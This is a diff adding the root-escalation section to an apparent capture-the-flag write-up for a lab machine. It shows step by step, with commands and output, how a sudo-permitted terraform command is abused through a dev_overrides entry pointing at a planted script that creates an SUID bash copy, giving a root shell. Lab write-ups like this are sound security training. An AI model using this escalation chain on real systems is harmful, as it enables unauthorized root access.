@@ -145,6 +145,115 @@ user flag value
 
 ## Root Exploitation
 
+We check if user `jeremy` has sudo privileges:
+```bash
+sudo -l
+```
+```
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+```
+
+We check what we are running if executing sudo command:
+```bash
+cat /opt/examples/main.tf
+```
+```
+terraform {
+  required_providers {
+    examples = {
+      source = "previous.htb/terraform/examples"
+    }
+  }
+}
+
+variable "source_path" {
+  type = string
+  default = "/root/examples/hello-world.ts"
+
+  validation {
+    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
+    error_message = "The source_path must contain '/root/examples/'."
+  }
+}
+
+provider "examples" {}
+
+resource "examples_example" "example" {
+  source_path = var.source_path
+}
+
+output "destination_path" {
+  value = examples_example.example.destination_path
+}
+```
+
+We see that user running this script, will execute providers in `previous.htb/terraform/examples`.
+
+If we go to our own `.terraformrc` file, we will find the following configuration:
+```bash
+cat ~/.terraformrc
+```
+```
+provider_installation {
+        dev_overrides {
+                "previous.htb/terraform/examples" = "/usr/local/go/bin"
+        }
+        direct {}
+}
+```
+
+It is important to note that the `dev_overrides` allows us to specify a local path for the provider.
+
+We can use this on our advantage, we can change the local path provider to point to our own malicious binary which will be executed instead of the original provider by root.
+```bash
+echo "#!/bin/bash
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+" > /tmp/terraform-provider-examples
+chmod +x /tmp/terraform-provider-examples
+
+echo "provider_installation {
+        dev_overrides {
+                "previous.htb/terraform/examples" = "/tmp"
+        }
+        direct {}
+}" > ~/.terraformrc
+```
+
+Then we can execute the terraform command with sudo privileges:
+```bash
+sudo /usr/bin/terraform -chdir=/opt/examples apply
+```
+
+We check everything has worked as expected:
+```bash
+ll /tmp/bash
+```
+```
+-rwsr-sr-x 1 root root 1396520 Aug 24 11:14 /tmp/bash*
+```
+
+We can now escalate our privileges to root by exploiting the SUID bit on the `/tmp/bash` binary.
+```bash
+/tmp/bash -p
+whoami
+```
+```
+root
+```
+We now can check the root flag.
+```bash
+cat /root/root.txt
+```
+```
+root flag value
+```
+
 ## Conclusion
 
-
+This write-up demonstrates the process of exploiting a vulnerable Terraform configuration to escalate privileges from a low-privileged user to root. By understanding the inner workings of the Terraform provider installation and leveraging the SUID bit on a malicious binary, we were able to gain root access and retrieve the root flag.
